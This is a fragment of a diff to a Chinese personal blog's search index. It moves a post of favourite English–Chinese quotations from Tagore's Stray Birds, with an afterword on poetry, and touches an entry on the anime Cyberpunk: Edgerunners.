+<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>曾经听说，所有的作家最初都想成为诗人。<br>诗人，将“美”用文字记录下来，成为了永恒的“美”。<br>让能够理解这样的“美”的人，去跨时代，跨地域，跨文化与诗人产生灵魂的碰撞！</p>
+]]></content>
+      <categories>
+        <category>摘抄</category>
+      </categories>
+      <tags>
+        <tag>诗</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>赛博朋克~边缘行者--渺小个人的癫狂悲剧</title>
     <url>/2022/11/19/%E8%B5%9B%E5%8D%9A%E6%9C%8B%E5%85%8B%E5%8A%A8%E7%94%BB/</url>
     <content><![CDATA[<p><img src="/images/Cyberpunk.png" alt="Cyberpunk"></p>
@@ -5001,30 +5193,6 @@ secure_file_priv 一栏的value为空，即是成功</li>
       </categories>
       <tags>
         <tag>动画</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>飞鸟集--摘抄</title>
-    <url>/2022/11/18/%E9%A3%9E%E9%B8%9F%E9%9B%86_%E6%91%98%E6%8A%84/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近突然想起了泰戈尔的飞鸟集里的一些诗，来了兴致，便又重读了飞鸟集，不由得感叹，诗真美啊。这样的美，大概是永恒吧。</p>
-<span id="more"></span>
-<h1 id="喜欢的句子"><a href="#喜欢的句子" class="headerlink" title="喜欢的句子"></a>喜欢的句子</h1><ol>
-<li>It is the tears of the earth that keep here smiles in bloom.<br>是大地的泪点，使她的微笑保持着青春不谢。</li>
-<li>If you shed tears when you miss the sun, you also miss the stars.<br>如果你因失去了太阳而流泪，那么你也将失去群星了。</li>
-<li>Her wishful face haunts my dreams like the rain at night.<br>她的热切的脸，如夜雨似的，搅扰着我的梦魂。</li>
-<li>Sorrow is hushed into peace in my heart like the evening among the silent trees.<br>忧思在我的心里平静下去，正如暮色降临在寂静的山林中。</li>
-<li>Do not seat your love upon a precipice because it is high.<br>不要因为峭壁是高的，便让你的爱情坐在峭壁上。</li>
-<li>What you are you do not see, what you see is your shadow.<br>你看不见你自己，你所看见的只是你的影子。</li>
-<li>His own mornings are new surprises to God.<br>神自己的清晨，在他自己看来也是新奇的。</li>
-</ol>
-<p>未完待续…</p>
-<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>曾经听说，所有的作家最初都想成为诗人。<br>诗人，将“美”用文字记录下来，成为了永恒的“美”。<br>让能够理解这样的“美”的人，去跨时代，跨地域，跨文化与诗人产生灵魂的碰撞！</p>
-]]></content>
-      <categories>
-        <category>摘抄</category>
-      </categories>
-      <tags>
-        <tag>诗</tag>
       </tags>
   </entry>
 </search>
